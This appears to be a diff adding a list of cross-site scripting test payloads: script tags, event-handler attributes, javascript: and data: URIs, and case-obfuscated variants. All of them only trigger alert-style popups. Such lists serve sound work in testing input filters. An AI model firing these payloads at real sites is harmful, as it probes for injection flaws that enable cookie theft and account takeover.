@@ -1,0 +1,38 @@
+<script>alert(1)</script>
+<ScRiPt>alert(document.cookie)</ScRiPt>
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(document.domain)>
+<details open ontoggle=alert(1)>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+javascript:alert(1)
+JaVaScRiPt:alert(document.cookie)
+<img src=x onerror="prompt(1)">
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<div onmouseover=alert(1)>hover</div>
+'><script>alert(String.fromCharCode(88,83,83))</script>
+"><svg/onload=confirm(1)>
+<base href="javascript:alert(1)//">
+<link rel=stylesheet href="javascript:alert(1)">
+<meta http-equiv=refresh content="0;javascript:alert(1)">
+<math><mi//xlink:href="data:x,<script>alert(1)</script>">
+<form><button formaction="javascript:alert(1)">x</button>
+<isindex formaction="javascript:alert(1)" type=image>
+<frameset onload=alert(1)>
+<applet code="javascript:alert(1)">
+vbscript:msgbox(1)
+data:text/html,<script>alert(1)</script>
+<image src=x onerror=alert(1)>
+<style>@import 'javascript:alert(1)';</style>
+<video><source src=x onerror=eval(alert(1))>
+<700 onauxclick=alert(1)>x</700>
+<svg><animate onbegin=alert(1)>
+<custom onbeforexrselect=alert(1)>x</custom>
+<expression>expression(alert(1))</expression>
